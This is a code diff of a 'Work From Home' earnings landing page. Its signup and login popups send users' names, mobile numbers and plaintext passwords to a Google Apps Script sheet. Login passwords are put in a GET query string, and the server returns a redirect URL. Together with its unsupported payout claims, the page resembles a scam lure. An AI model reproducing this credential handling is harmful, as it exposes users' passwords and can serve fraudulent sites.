@@ -26,7 +26,6 @@
       position: relative;
     }
 
-    /* Login button positioned at top right corner */
     .login-btn-top {
       position: absolute;
       top: 20px;
@@ -165,7 +164,6 @@
       margin-bottom: 14px;
     }
 
-    /* FAQ toggle */
     .faq-item {
       padding: 16px 20px;
       margin-bottom: 16px;
@@ -214,7 +212,6 @@
       margin: 0;
     }
 
-    /* Popup overlay */
     .popup-overlay {
       position: fixed;
       top: 0;
@@ -333,7 +330,6 @@
       margin-left: 6px;
     }
 
-    /* Password popup specific */
     .password-popup .popup {
       max-width: 400px;
     }
@@ -401,9 +397,7 @@
   </style>
 </head>
 <body>
-  <!-- HEADER -->
   <header>
-    <!-- LOGIN BUTTON AT TOP RIGHT CORNER -->
     <button class="login-btn-top" id="openLoginBtn"><i class="fas fa-sign-in-alt"></i> Login</button>
     
     <h1>Work From Home</h1>
@@ -411,7 +405,6 @@
     <button class="cta-btn" id="openPopupBtn"><i class="fas fa-rocket"></i> Start Today</button>
   </header>
 
-  <!-- STATS -->
   <section class="stats">
     <div class="stat"><h2>10,000+</h2><p>Members</p></div>
     <div class="stat"><h2>₹50L+</h2><p>Paid Out</p></div>
@@ -419,7 +412,6 @@
     <div class="stat"><h2>100%</h2><p>Remote</p></div>
   </section>
 
-  <!-- TASKS -->
   <section class="section">
     <div class="section-title"><h2>Available Tasks</h2></div>
     <div class="cards">
@@ -430,7 +422,6 @@
     </div>
   </section>
 
-  <!-- STEPS -->
   <section class="section">
     <div class="section-title"><h2>How It Works</h2></div>
     <div class="steps">
@@ -440,7 +431,6 @@
     </div>
   </section>
 
-  <!-- TESTIMONIALS -->
   <section class="section">
     <div class="section-title"><h2>Testimonials</h2></div>
     <div class="testimonials">
@@ -450,7 +440,6 @@
     </div>
   </section>
 
-  <!-- FAQ -->
   <section class="section">
     <div class="section-title"><h2>Frequently Asked Questions</h2></div>
 
@@ -479,14 +468,13 @@
     </div>
   </section>
 
-  <!-- FINAL CTA -->
   <section class="section" style="text-align:center;">
     <h2>Ready to Start?</h2>
     <p style="margin:15px 0; color: #475569;">Join today and begin earning from simple online tasks.</p>
     <button class="cta-btn" id="openPopupBtn2"><i class="fas fa-user-plus"></i> Join Now</button>
   </section>
 
-  <!-- MAIN POPUP (Signup) -->
+  <!-- SIGNUP POPUP -->
   <div class="popup-overlay" id="popupOverlay">
     <div class="popup">
       <button class="popup-close" id="closePopupBtn"><i class="fas fa-times"></i></button>
@@ -509,7 +497,7 @@
     </div>
   </div>
 
-  <!-- PASSWORD POPUP (Step 1) -->
+  <!-- PASSWORD POPUP -->
   <div class="popup-overlay password-popup" id="passwordPopup">
     <div class="popup">
       <button class="popup-close" id="closePasswordPopup"><i class="fas fa-times"></i></button>
@@ -525,7 +513,7 @@
     </div>
   </div>
 
-  <!-- CONFIRM PASSWORD POPUP (Step 2) -->
+  <!-- CONFIRM PASSWORD POPUP -->
   <div class="popup-overlay password-popup" id="confirmPopup">
     <div class="popup">
       <button class="popup-close" id="closeConfirmPopup"><i class="fas fa-times"></i></button>
@@ -558,7 +546,7 @@
         
         <div class="login-error" id="loginError">Invalid mobile number or password. Please try again.</div>
         
-        <button type="submit" class="submit-btn"><i class="fas fa-sign-in-alt" style="margin-right:8px;"></i> Login</button>
+        <button type="submit" class="submit-btn" id="loginSubmitBtn"><i class="fas fa-sign-in-alt" style="margin-right:8px;"></i> Login</button>
       </form>
       <p style="margin-top:16px; font-size:0.85rem; color:#94a3b8; text-align:center;">
         Don't have an account? <a href="#" id="switchToSignup" style="color:#2563eb; text-decoration:none; font-weight:600;">Sign up here</a>
@@ -570,7 +558,6 @@
     <p>© 2026 Work From Home. All Rights Reserved.</p>
   </footer>
 
-  <!-- ========== JAVASCRIPT ========== -->
   <script>
     (function() {
       "use strict";
@@ -594,11 +581,10 @@
       const confirmForm = document.getElementById('confirmForm');
       const loginForm = document.getElementById('loginForm');
       
-      // Store user data and password
       let userData = {};
       let tempPassword = '';
 
-      // APPSCRIPT URL
+      // APPSCRIPT URL - REPLACE WITH YOUR DEPLOYED URL
       const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxjJUuHfXCLNToCHHUkN1aKrBqJNnmv7MLWGF_iOvDwk2YVQoouQRYYLzadMeq1PTNvDA/exec';
 
       // ----- Open / Close functions -----
@@ -650,7 +636,6 @@
         document.getElementById('loginError').classList.remove('show');
       }
 
-      // Close all popups
       function closeAllPopups() {
         closePopup();
         closePasswordPopup();
@@ -659,22 +644,18 @@
         document.body.style.overflow = '';
       }
 
-      // Event listeners for opening main popup
+      // Event listeners
       openBtns.forEach(btn => btn.addEventListener('click', openPopup));
       closeBtn.addEventListener('click', closePopup);
-
-      // Login button
       openLoginBtn.addEventListener('click', openLoginPopup);
       closeLoginBtn.addEventListener('click', closeLoginPopup);
       
-      // Switch from login to signup
       switchToSignup.addEventListener('click', function(e) {
         e.preventDefault();
         closeLoginPopup();
         openPopup();
       });
 
-      // Close password popups
       closePasswordBtn.addEventListener('click', closePasswordPopup);
       closeConfirmBtn.addEventListener('click', closeConfirmPopup);
 
@@ -692,7 +673,7 @@
         if (e.target === loginPopup) closeLoginPopup();
       });
 
-      // ----- FAQ Toggle -----
+      // FAQ Toggle
       const faqToggles = document.querySelectorAll('.faq-toggle');
       faqToggles.forEach(btn => {
         btn.addEventListener('click', function(e) {
@@ -705,7 +686,7 @@
         });
       });
 
-      // ----- Step 1: Main form submit -> open password popup -----
+      // ----- SIGNUP: Step 1 -----
       form.addEventListener('submit', function(e) {
         e.preventDefault();
 
@@ -722,15 +703,12 @@
           return;
         }
 
-        // Store user data
         userData = { name, mobile, email: email || 'not provided' };
-        
-        // Close main popup and open password popup
         closePopup();
         openPasswordPopup();
       });
 
-      // ----- Step 2: Password form submit -> open confirm popup -----
+      // ----- SIGNUP: Step 2 -----
       passwordForm.addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -746,7 +724,7 @@
         openConfirmPopup();
       });
 
-      // ----- Step 3: Confirm password and submit all data -----
+      // ----- SIGNUP: Step 3 -----
       confirmForm.addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -760,7 +738,6 @@
         
         errorEl.classList.remove('show');
         
-        // Prepare full payload
         const payload = {
           name: userData.name,
           mobile: userData.mobile,
@@ -769,7 +746,6 @@
           timestamp: new Date().toISOString()
         };
 
-        // Send to AppScript
         const submitBtn = confirmForm.querySelector('.submit-btn');
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating account...';
@@ -784,7 +760,6 @@
           alert('🎉 Success! Your account has been created.');
           closeConfirmPopup();
           closeAllPopups();
-          // Reset everything
           userData = {};
           tempPassword = '';
           form.reset();
@@ -799,34 +774,50 @@
         });
       });
 
-      // ----- LOGIN: Check credentials against sheet -----
+      // ----- LOGIN: Verify credentials and redirect -----
       loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
 
         const mobile = document.getElementById('loginMobile').value.trim();
         const password = document.getElementById('loginPassword').value.trim();
         const errorEl = document.getElementById('loginError');
+        const submitBtn = document.getElementById('loginSubmitBtn');
 
         if (!mobile || !password) {
           alert('Please enter both mobile number and password.');
           return;
         }
 
-        // Simulate login check (since we can't query Google Sheets directly from client)
-        // In a real app, you'd have a separate AppScript endpoint to verify credentials
-        // For now, we'll show a demo success
         errorEl.classList.remove('show');
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
 
-        // Send verification request to AppScript (you'd need a separate GET/query endpoint)
-        // For demo purposes, we'll accept any mobile/password with length > 5
-        // You should replace this with a proper server-side verification
-        if (mobile.length >= 10 && password.length >= 6) {
-          alert('✅ Login successful! Welcome back.');
-          closeLoginPopup();
-          // You can redirect or show dashboard here
-        } else {
+        // Call AppScript to verify credentials and get redirect URL
+        const verifyUrl = SCRIPT_URL + '?action=login&mobile=' + encodeURIComponent(mobile) + '&password=' + encodeURIComponent(password);
+
+        fetch(verifyUrl, {
+          method: 'GET',
+          headers: { 'Content-Type': 'application/json' }
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success && data.redirectUrl) {
+            // Redirect to the URL from column 7
+            window.location.href = data.redirectUrl;
+          } else {
+            errorEl.classList.add('show');
+            errorEl.textContent = data.message || 'Invalid mobile number or password.';
+          }
+        })
+        .catch(err => {
+          console.error('Login error:', err);
           errorEl.classList.add('show');
-        }
+          errorEl.textContent = 'Network error. Please try again.';
+        })
+        .finally(() => {
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = '<i class="fas fa-sign-in-alt" style="margin-right:8px;"></i> Login';
+        });
       });
 
     })();
